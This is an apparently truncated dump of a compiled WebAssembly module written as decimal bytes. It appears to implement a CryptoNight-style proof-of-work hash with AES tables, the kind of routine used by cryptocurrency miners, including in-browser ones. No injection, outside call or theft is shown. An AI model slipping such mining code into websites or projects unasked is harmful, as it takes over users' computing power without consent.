65,200,130,128,1,106,33,17,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,6,41,3,0,133,55,3,0,32,3,32,3,41,3,0,32,6,41,3,8,133,55,3,0,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,16,114,106,34,6,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,6,41,3,8,133,55,3,0,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,32,114,106,34,6,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,6,41,3,8,133,55,3,0,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,48,114,106,34,6,41,3,0,133,55,3,0,32,13,32,13,41,3,0,32,6,41,3,8,133,55,3,0,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,23,32,23,41,3,0,32,0,32,1,65,192,0,114,106,34,6,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,6,41,3,8,133,55,3,0,32,23,32,8,40,2,0,40,2,0,40,2,12,16,9,32,24,32,24,41,3,0,32,0,32,1,65,208,0,114,106,34,6,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,6,41,3,8,133,55,3,0,32,24,32,8,40,2,0,40,2,0,40,2,12,16,9,32,25,32,25,41,3,0,32,0,32,1,65,224,0,114,106,34,6,41,3,0,133,55,3,0,32,16,32,16,41,3,0,32,6,41,3,8,133,55,3,0,32,25,32,8,40,2,0,40,2,0,40,2,12,16,9,32,26,32,26,41,3,0,32,0,32,1,65,240,0,114,106,34,6,41,3,0,133,55,3,0,32,17,32,17,41,3,0,32,6,41,3,8,133,55,3,0,32,26,32,8,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,19,16,19,32,19,65,200,1,32,2,32,19,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,7,36,4,11,139,20,2,20,127,7,126,35,4,33,3,35,4,65,208,1,106,36,4,32,3,32,1,41,0,0,55,0,0,32,3,32,1,41,0,8,55,0,8,32,3,32,1,41,0,16,55,0,16,32,3,32,1,41,0,24,55,0,24,32,3,32,1,41,0,32,55,0,32,32,3,32,1,41,0,40,55,0,40,32,3,32,1,41,0,48,55,0,48,32,3,32,1,41,0,56,55,0,56,32,3,32,1,41,0,64,55,0,64,32,3,32,1,40,0,72,54,0,72,32,3,65,208,0,106,34,4,66,0,55,3,0,32,4,66,0,55,3,8,32,4,66,0,55,3,16,32,4,66,0,55,3,24,32,4,66,0,55,3,32,32,4,66,0,55,3,40,32,4,66,0,55,3,48,32,4,66,0,55,3,56,32,4,66,0,55,3,64,32,4,66,0,55,3,72,32,4,66,0,55,3,80,32,4,66,0,55,3,88,32,4,66,0,55,3,96,32,4,66,0,55,3,104,32,4,66,0,55,3,112,32,3,65,200,0,106,34,4,32,4,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,3,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,3,65,8,106,34,4,32,4,40,2,0,65,158,142,249,132,126,115,54,2,0,32,3,16,19,32,0,65,128,128,128,1,106,34,13,32,3,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,192,129,128,1,106,41,3,0,33,29,32,1,41,3,35,33,24,32,0,65,144,131,128,1,106,34,9,40,2,0,32,13,16,18,32,0,65,224,129,128,1,106,33,16,32,0,65,240,129,128,1,106,33,17,32,0,65,128,130,128,1,106,33,18,32,0,65,144,130,128,1,106,33,19,32,0,65,160,130,128,1,106,33,20,32,0,65,176,130,128,1,106,33,21,32,0,65,192,130,128,1,106,33,22,65,0,33,1,3,64,32,4,32,9,40,2,0,40,2,0,40,2,12,16,9,32,16,32,9,40,2,0,40,2,0,40,2,12,16,9,32,17,32,9,40,2,0,40,2,0,40,2,12,16,9,32,18,32,9,40,2,0,40,2,0,40,2,12,16,9,32,19,32,9,40,2,0,40,2,0,40,2,12,16,9,32,20,32,9,40,2,0,40,2,0,40,2,12,16,9,32,21,32,9,40,2,0,40,2,0,40,2,12,16,9,32,22,32,9,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,6,32,4,41,0,0,55,0,0,32,6,32,4,41,0,8,55,0,8,32,6,32,4,41,0,16,55,0,16,32,6,32,4,41,0,24,55,0,24,32,6,32,4,41,0,32,55,0,32,32,6,32,4,41,0,40,55,0,40,32,6,32,4,41,0,48,55,0,48,32,6,32,4,41,0,56,55,0,56,32,6,32,4,41,0,64,55,0,64,32,6,32,4,41,0,72,55,0,72,32,6,32,4,41,0,80,55,0,80,32,6,32,4,41,0,88,55,0,88,32,6,32,4,41,0,96,55,0,96,32,6,32,4,41,0,104,55,0,104,32,6,32,4,41,0,112,55,0,112,32,6,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,24,32,29,133,33,29,32,0,65,208,130,128,1,106,34,6,32,0,65,160,128,128,1,106,34,23,41,3,0,32,13,41,3,0,133,34,24,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,10,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,11,32,0,65,136,131,128,1,106,33,15,65,0,33,1,32,24,167,33,7,3,64,32,0,32,7,65,240,255,255,0,113,106,34,7,32,11,32,6,16,20,32,7,32,10,41,3,0,32,11,41,3,0,133,55,3,0,32,7,32,14,41,3,0,32,15,41,3,0,133,34,24,55,3,8,32,7,65,144,166,29,32,24,66,27,136,167,65,6,113,32,24,66,24,136,167,34,7,65,1,113,114,65,1,116,118,65,48,113,32,7,115,58,0,11,32,11,41,3,0,34,26,66,32,136,33,24,32,0,32,11,40,2,0,65,240,255,255,0,113,106,34,7,41,3,0,34,28,66,32,136,34,30,32,26,66,255,255,255,255,15,131,34,25,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,25,126,33,25,32,26,32,27,32,24,126,124,32,25,66,32,136,124,34,27,66,32,134,32,25,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,25,32,6,32,6,41,3,0,32,30,32,24,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,24,32,28,133,55,3,0,32,12,32,25,32,7,65,8,106,34,8,41,3,0,133,55,3,0,32,7,32,24,55,3,0,32,8,32,25,32,29,133,55,3,0,32,0,32,6,40,2,0,65,240,255,255,0,113,106,34,7,32,10,32,6,16,20,32,7,32,11,41,3,0,32,10,41,3,0,133,55,3,0,32,7,32,15,41,3,0,32,14,41,3,0,133,34,24,55,3,8,32,7,65,144,166,29,32,24,66,27,136,167,65,6,113,32,24,66,24,136,167,34,7,65,1,113,114,65,1,116,118,65,48,113,32,7,115,58,0,11,32,10,41,3,0,34,26,66,32,136,33,24,32,0,32,10,40,2,0,65,240,255,255,0,113,106,34,7,41,3,0,34,28,66,32,136,34,30,32,26,66,255,255,255,255,15,131,34,25,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,25,126,33,25,32,26,32,27,32,24,126,124,32,25,66,32,136,124,34,27,66,32,134,32,25,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,25,32,6,32,6,41,3,0,32,30,32,24,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,24,32,28,133,55,3,0,32,12,32,25,32,7,65,8,106,34,8,41,3,0,133,55,3,0,32,7,32,24,55,3,0,32,8,32,25,32,29,133,55,3,0,32,1,65,1,106,34,1,65,128,128,16,71,4,64,32,6,40,2,0,33,7,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,9,40,2,0,32,23,16,18,32,0,65,216,129,128,1,106,33,6,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,11,32,0,65,136,130,128,1,106,33,12,32,0,65,152,130,128,1,106,33,7,32,0,65,168,130,128,1,106,33,14,32,0,65,184,130,128,1,106,33,15,32,0,65,200,130,128,1,106,33,23,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,8,41,3,0,133,55,3,0,32,6,32,6,41,3,0,32,8,41,3,8,133,55,3,0,32,4,32,9,40,2,0,40,2,0,40,2,12,16,9,32,16,32,16,41,3,0,32,0,32,1,65,16,114,106,34,8,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,8,41,3,8,133,55,3,0,32,16,32,9,40,2,0,40,2,0,40,2,12,16,9,32,17,32,17,41,3,0,32,0,32,1,65,32,114,106,34,8,41,3,0,133,55,3,0,32,11,32,11,41,3,0,32,8,41,3,8,133,55,3,0,32,17,32,9,40,2,0,40,2,0,40,2,12,16,9,32,18,32,18,41,3,0,32,0,32,1,65,48,114,106,34,8,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,8,41,3,8,133,55,3,0,32,18,32,9,40,2,0,40,2,0,40,2,12,16,9,32,19,32,19,41,3,0,32,0,32,1,65,192,0,114,106,34,8,41,3,0,133,55,3,0,32,7,32,7,41,3,0,32,8,41,3,8,133,55,3,0,32,19,32,9,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,208,0,114,106,34,8,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,8,41,3,8,133,55,3,0,32,20,32,9,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,224,0,114,106,34,8,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,8,41,3,8,133,55,3,0,32,21,32,9,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,240,0,114,106,34,8,41,3,0,133,55,3,0,32,23,32,23,41,3,0,32,8,41,3,8,133,55,3,0,32,22,32,9,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,13,16,19,32,13,65,200,1,32,2,32,13,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,3,36,4,11,128,19,2,20,127,6,126,35,4,33,3,35,4,65,208,1,106,36,4,32,3,32,1,41,0,0,55,0,0,32,3,32,1,41,0,8,55,0,8,32,3,32,1,41,0,16,55,0,16,32,3,32,1,41,0,24,55,0,24,32,3,32,1,41,0,32,55,0,32,32,3,32,1,41,0,40,55,0,40,32,3,32,1,41,0,48,55,0,48,32,3,32,1,41,0,56,55,0,56,32,3,32,1,41,0,64,55,0,64,32,3,32,1,40,0,72,54,0,72,32,3,65,208,0,106,34,1,66,0,55,3,0,32,1,66,0,55,3,8,32,1,66,0,55,3,16,32,1,66,0,55,3,24,32,1,66,0,55,3,32,32,1,66,0,55,3,40,32,1,66,0,55,3,48,32,1,66,0,55,3,56,32,1,66,0,55,3,64,32,1,66,0,55,3,72,32,1,66,0,55,3,80,32,1,66,0,55,3,88,32,1,66,0,55,3,96,32,1,66,0,55,3,104,32,1,66,0,55,3,112,32,3,65,200,0,106,34,1,32,1,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,3,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,3,16,19,32,0,65,128,128,128,1,106,34,13,32,3,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,144,131,128,1,106,34,8,40,2,0,32,13,16,18,32,0,65,224,129,128,1,106,33,16,32,0,65,240,129,128,1,106,33,17,32,0,65,128,130,128,1,106,33,18,32,0,65,144,130,128,1,106,33,19,32,0,65,160,130,128,1,106,33,20,32,0,65,176,130,128,1,106,33,21,32,0,65,192,130,128,1,106,33,22,65,0,33,1,3,64,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,16,32,8,40,2,0,40,2,0,40,2,12,16,9,32,17,32,8,40,2,0,40,2,0,40,2,12,16,9,32,18,32,8,40,2,0,40,2,0,40,2,12,16,9,32,19,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,6,32,4,41,0,0,55,0,0,32,6,32,4,41,0,8,55,0,8,32,6,32,4,41,0,16,55,0,16,32,6,32,4,41,0,24,55,0,24,32,6,32,4,41,0,32,55,0,32,32,6,32,4,41,0,40,55,0,40,32,6,32,4,41,0,48,55,0,48,32,6,32,4,41,0,56,55,0,56,32,6,32,4,41,0,64,55,0,64,32,6,32,4,41,0,72,55,0,72,32,6,32,4,41,0,80,55,0,80,32,6,32,4,41,0,88,55,0,88,32,6,32,4,41,0,96,55,0,96,32,6,32,4,41,0,104,55,0,104,32,6,32,4,41,0,112,55,0,112,32,6,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,0,65,208,130,128,1,106,34,6,32,0,65,160,128,128,1,106,34,23,41,3,0,32,13,41,3,0,133,34,25,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,10,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,11,32,0,65,136,131,128,1,106,33,15,65,0,33,1,32,25,167,33,9,3,64,32,0,32,9,65,240,255,255,0,113,106,34,9,32,11,32,6,16,20,32,9,32,10,41,3,0,32,11,41,3,0,133,55,3,0,32,9,32,14,41,3,0,32,15,41,3,0,133,55,3,8,32,11,41,3,0,34,26,66,32,136,33,25,32,0,32,11,40,2,0,65,240,255,255,0,113,106,34,9,41,3,0,34,28,66,32,136,34,29,32,26,66,255,255,255,255,15,131,34,24,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,24,126,33,24,32,26,32,27,32,25,126,124,32,24,66,32,136,124,34,27,66,32,134,32,24,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,24,32,6,32,6,41,3,0,32,29,32,25,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,25,32,28,133,55,3,0,32,12,32,24,32,9,65,8,106,34,7,41,3,0,133,55,3,0,32,9,32,25,55,3,0,32,7,32,24,55,3,0,32,0,32,6,40,2,0,65,240,255,255,0,113,106,34,9,32,10,32,6,16,20,32,9,32,11,41,3,0,32,10,41,3,0,133,55,3,0,32,9,32,15,41,3,0,32,14,41,3,0,133,55,3,8,32,10,41,3,0,34,26,66,32,136,33,25,32,0,32,10,40,2,0,65,240,255,255,0,113,106,34,9,41,3,0,34,28,66,32,136,34,29,32,26,66,255,255,255,255,15,131,34,24,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,24,126,33,24,32,26,32,27,32,25,126,124,32,24,66,32,136,124,34,27,66,32,134,32,24,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,24,32,6,32,6,41,3,0,32,29,32,25,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,25,32,28,133,55,3,0,32,12,32,24,32,9,65,8,106,34,7,41,3,0,133,55,3,0,32,9,32,25,55,3,0,32,7,32,24,55,3,0,32,1,65,1,106,34,1,65,128,128,16,71,4,64,32,6,40,2,0,33,9,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,8,40,2,0,32,23,16,18,32,0,65,216,129,128,1,106,33,6,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,11,32,0,65,136,130,128,1,106,33,12,32,0,65,152,130,128,1,106,33,14,32,0,65,168,130,128,1,106,33,15,32,0,65,184,130,128,1,106,33,9,32,0,65,200,130,128,1,106,33,23,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,7,41,3,0,133,55,3,0,32,6,32,6,41,3,0,32,7,41,3,8,133,55,3,0,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,16,32,16,41,3,0,32,0,32,1,65,16,114,106,34,7,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,7,41,3,8,133,55,3,0,32,16,32,8,40,2,0,40,2,0,40,2,12,16,9,32,17,32,17,41,3,0,32,0,32,1,65,32,114,106,34,7,41,3,0,133,55,3,0,32,11,32,11,41,3,0,32,7,41,3,8,133,55,3,0,32,17,32,8,40,2,0,40,2,0,40,2,12,16,9,32,18,32,18,41,3,0,32,0,32,1,65,48,114,106,34,7,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,7,41,3,8,133,55,3,0,32,18,32,8,40,2,0,40,2,0,40,2,12,16,9,32,19,32,19,41,3,0,32,0,32,1,65,192,0,114,106,34,7,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,7,41,3,8,133,55,3,0,32,19,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,208,0,114,106,34,7,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,7,41,3,8,133,55,3,0,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,224,0,114,106,34,7,41,3,0,133,55,3,0,32,9,32,9,41,3,0,32,7,41,3,8,133,55,3,0,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,240,0,114,106,34,7,41,3,0,133,55,3,0,32,23,32,23,41,3,0,32,7,41,3,8,133,55,3,0,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,13,16,19,32,13,65,200,1,32,2,32,13,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,3,36,4,11,27,1,1,127,35,4,33,1,35,4,32,0,106,36,4,35,4,65,15,106,65,112,113,36,4,32,1,11,11,201,67,3,0,65,128,8,11,224,39,198,99,99,165,248,124,124,132,238,119,119,153,246,123,123,141,255,242,242,13,214,107,107,189,222,111,111,177,145,197,197,84,96,48,48,80,2,1,1,3,206,103,103,169,86,43,43,125,231,254,254,25,181,215,215,98,77,171,171,230,236,118,118,154,143,202,202,69,31,130,130,157,137,201,201,64,250,125,125,135,239,250,250,21,178,89,89,235,142,71,71,201,251,240,240,11,65,173,173,236,179,212,212,103,95,162,162,253,69,175,175,234,35,156,156,191,83,164,164,247,228,114,114,150,155,192,192,91,117,183,183,194,225,253,253,28,61,147,147,174,76,38,38,106,108,54,54,90,126,63,63,65,245,247,247,2,131,204,204,79,104,52,52,92,81,165,165,244,209,229,229,52,249,241,241,8,226,113,113,147,171,216,216,115,98,49,49,83,42,21,21,63,8,4,4,12,149,199,199,82,70,35,35,101,157,195,195,94,48,24,24,40,55,150,150,161,10,5,5,15,47,154,154,181,14,7,7,9,36,18,18,54,27,128,128,155,223,226,226,61,205,235,235,38,78,39,39,105,127,178,178,205,234,117,117,159,18,9,9,27,29,131,131,158,88,44,44,116,52,26,26,46,54,27,27,45,220,110,110,178,180,90,90,238,91,160,160,251,164,82,82,246,118,59,59,77,183,214,214,97,125,179,179,206,82,41,41,123,221,227,227,62,94,47,47,113,19,132,132,151,166,83,83,245,185,209,209,104,0,0,0,0,193,237,237,44,64,32,32,96,227,252,252,31,121,177,177,200,182,91,91,237,212,106,106,190,141,203,203,70,103,190,190,217,114,57,57,75,148,74,74,222,152,76,76,212,176,88,88,232,133,207,207,74,187,208,208,107,197,239,239,42,79,170,170,229,237,251,251,22,134,67,67,197,154,77,77,215,102,51,51,85,17,133,133,148,138,69,69,207,233,249,249,16,4,2,2,6,254,127,127,129,160,80,80,240,120,60,60,68,37,159,159,186,75,168,168,227,162,81,81,243,93,163,163,254,128,64,64,192,5,143,143,138,63,146,146,173,33,157,157,188,112,56,56,72,241,245,245,4,99,188,188,223,119,182,182,193,175,218,218,117,66,33,33,99,32,16,16,48,229,255,255,26,253,243,243,14,191,210,210,109,129,205,205,76,24,12,12,20,38,19,19,53,195,236,236,47,190,95,95,225,53,151,151,162,136,68,68,204,46,23,23,57,147,196,196,87,85,167,167,242,252,126,126,130,122,61,61,71,200,100,100,172,186,93,93,231,50,25,25,43,230,115,115,149,192,96,96,160,25,129,129,152,158,79,79,209,163,220,220,127,68,34,34,102,84,42,42,126,59,144,144,171,11,136,136,131,140,70,70,202,199,238,238,41,107,184,184,211,40,20,20,60,167,222,222,121,188,94,94,226,22,11,11,29,173,219,219,118,219,224,224,59,100,50,50,86,116,58,58,78,20,10,10,30,146,73,73,219,12,6,6,10,72,36,36,108,184,92,92,228,159,194,194,93,189,211,211,110,67,172,172,239,196,98,98,166,57,145,145,168,49,149,149,164,211,228,228,55,242,121,121,139,213,231,231,50,139,200,200,67,110,55,55,89,218,109,109,183,1,141,141,140,177,213,213,100,156,78,78,210,73,169,169,224,216,108,108,180,172,86,86,250,243,244,244,7,207,234,234,37,202,101,101,175,244,122,122,142,71,174,174,233,16,8,8,24,111,186,186,213,240,120,120,136,74,37,37,111,92,46,46,114,56,28,28,36,87,166,166,241,115,180,180,199,151,198,198,81,203,232,232,35,161,221,221,124,232,116,116,156,62,31,31,33,150,75,75,221,97,189,189,220,13,139,139,134,15,138,138,133,224,112,112,144,124,62,62,66,113,181,181,196,204,102,102,170,144,72,72,216,6,3,3,5,247,246,246,1,28,14,14,18,194,97,97,163,106,53,53,95,174,87,87,249,105,185,185,208,23,134,134,145,153,193,193,88,58,29,29,39,39,158,158,185,217,225,225,56,235,248,248,19,43,152,152,179,34,17,17,51,210,105,105,187,169,217,217,112,7,142,142,137,51,148,148,167,45,155,155,182,60,30,30,34,21,135,135,146,201,233,233,32,135,206,206,73,170,85,85,255,80,40,40,120,165,223,223,122,3,140,140,143,89,161,161,248,9,137,137,128,26,13,13,23,101,191,191,218,215,230,230,49,132,66,66,198,208,104,104,184,130,65,65,195,41,153,153,176,90,45,45,119,30,15,15,17,123,176,176,203,168,84,84,252,109,187,187,214,44,22,22,58,165,198,99,99,132,248,124,124,153,238,119,119,141,246,123,123,13,255,242,242,189,214,107,107,177,222,111,111,84,145,197,197,80,96,48,48,3,2,1,1,169,206,103,103,125,86,43,43,25,231,254,254,98,181,215,215,230,77,171,171,154,236,118,118,69,143,202,202,157,31,130,130,64,137,201,201,135,250,125,125,21,239,250,250,235,178,89,89,201,142,71,71,11,251,240,240,236,65,173,173,103,179,212,212,253,95,162,162,234,69,175,175,191,35,156,156,247,83,164,164,150,228,114,114,91,155,192,192,194,117,183,183,28,225,253,253,174,61,147,147,106,76,38,38,90,108,54,54,65,126,63,63,2,245,247,247,79,131,204,204,92,104,52,52,244,81,165,165,52,209,229,229,8,249,241,241,147,226,113,113,115,171,216,216,83,98,49,49,63,42,21,21,12,8,4,4,82,149,199,199,101,70,35,35,94,157,195,195,40,48,24,24,161,55,150,150,15,10,5,5,181,47,154,154,9,14,7,7,54,36,18,18,155,27,128,128,61,223,226,226,38,205,235,235,105,78,39,39,205,127,178,178,159,234,117,117,27,18,9,9,158,29,131,131,116,88,44,44,46,52,26,26,45,54,27,27,178,220,110,110,238,180,90,90,251,91,160,160,246,164,82,82,77,118,59,59,97,183,214,214,206,125,179,179,123,82,41,41,62,221,227,227,113,94,47,47,151,19,132,132,245,166,83,83,104,185,209,209,0,0,0,0,44,193,237,237,96,64,32,32,31,227,252,252,200,121,177,177,237,182,91,91,190,212,106,106,70,141,203,203,217,103,190,190,75,114,57,57,222,148,74,74,212,152,76,76,232,176,88,88,74,133,207,207,107,187,208,208,42,197,239,239,229,79,170,170,22,237,251,251,197,134,67,67,215,154,77,77,85,102,51,51,148,17,133,133,207,138,69,69,16,233,249,249,6,4,2,2,129,254,127,127,240,160,80,80,68,120,60,60,186,37,159,159,227,75,168,168,243,162,81,81,254,93,163,163,192,128,64,64,138,5,143,143,173,63,146,146,188,33,157,157,72,112,56,56,4,241,245,245,223,99,188,188,193,119,182,182,117,175,218,218,99,66,33,33,48,32,16,16,26,229,255,255,14,253,243,243,109,191,210,210,76,129,205,205,20,24,12,12,53,38,19,19,47,195,236,236,225,190,95,95,162,53,151,151,204,136,68,68,57,46,23,23,87,147,196,196,242,85,167,167,130,252,126,126,71,122,61,61,172,200,100,100,231,186,93,93,43,50,25,25,149,230,115,115,160,192,96,96,152,25,129,129,209,158,79,79,127,163,220,220,102,68,34,34,126,84,42,42,171,59,144,144,131,11,136,136,202,140,70,70,41,199,238,238,211,107,184,184,60,40,20,20,121,167,222,222,226,188,94,94,29,22,11,11,118,173,219,219,59,219,224,224,86,100,50,50,78,116,58,58,30,20,10,10,219,146,73,73,10,12,6,6,108,72,36,36,228,184,92,92,93,159,194,194,110,189,211,211,239,67,172,172,166,196,98,98,168,57,145,145,164,49,149,149,55,211,228,228,139,242,121,121,50,213,231,231,67,139,200,200,89,110,55,55,183,218,109,109,140,1,141,141,100,177,213,213,210,156,78,78,224,73,169,169,180,216,108,108,250,172,86,86,7,243,244,244,37,207,234,234,175,202,101,101,142,244,